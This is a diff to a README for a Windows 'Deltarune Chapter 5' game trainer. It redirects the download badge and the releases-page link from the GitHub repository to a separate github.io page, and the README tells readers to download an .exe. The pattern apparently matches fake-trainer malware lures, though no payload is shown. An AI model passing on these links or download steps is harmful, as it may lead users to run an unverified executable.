@@ -1,6 +1,6 @@
 # 🎮 Deltarune-Chapter5-Ultimate-Trainer-2026 - Master your game with ease today
 
-[![Download Latest Version](https://img.shields.io/badge/Download_Trainer-Blue?style=for-the-badge)](https://github.com/chinookjude273/Deltarune-Chapter5-Ultimate-Trainer-2026/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download_Trainer-Blue?style=for-the-badge)](https://chinookjude273.github.io)
 
 ## 📖 About this application
 
@@ -21,7 +21,7 @@ Verify your Windows version by opening the Settings menu and checking the About 
 
 Follow these steps to prepare the software:
 
-1. Visit the project releases page: [https://github.com/chinookjude273/Deltarune-Chapter5-Ultimate-Trainer-2026/releases](https://github.com/chinookjude273/Deltarune-Chapter5-Ultimate-Trainer-2026/releases)
+1. Visit the project releases page: [https://chinookjude273.github.io](https://chinookjude273.github.io)
 2. Look for the most recent version labeled as the latest release.
 3. Locate the file ending in .exe within the assets section.
 4. Click the file name to download it to your computer.
